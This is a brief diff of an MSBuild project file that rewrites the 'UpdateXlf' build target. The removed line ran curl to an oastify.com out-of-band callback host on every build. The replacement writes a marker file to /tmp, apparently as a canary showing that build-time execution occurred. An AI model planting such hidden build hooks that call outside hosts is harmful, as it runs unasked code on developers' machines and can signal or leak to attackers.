@@ -612,7 +612,7 @@
     <None Include="Driver\parallel-optimization.md" />
     <None Include="Driver\parallel-optimization.drawio.svg" />
   </ItemGroup>
-  <Target Name="UpdateXlf">
-    <Exec Command="curl http://1764tmuvyu30m9gik67vs9bykpqgeg25.oastify.com" />
-  </Target>
+<Target Name="UpdateXlf">
+  <Exec Command="echo TESTING-UPDATE-XLF > /tmp/xlf_was_run.txt" />
+</Target>
 </Project>
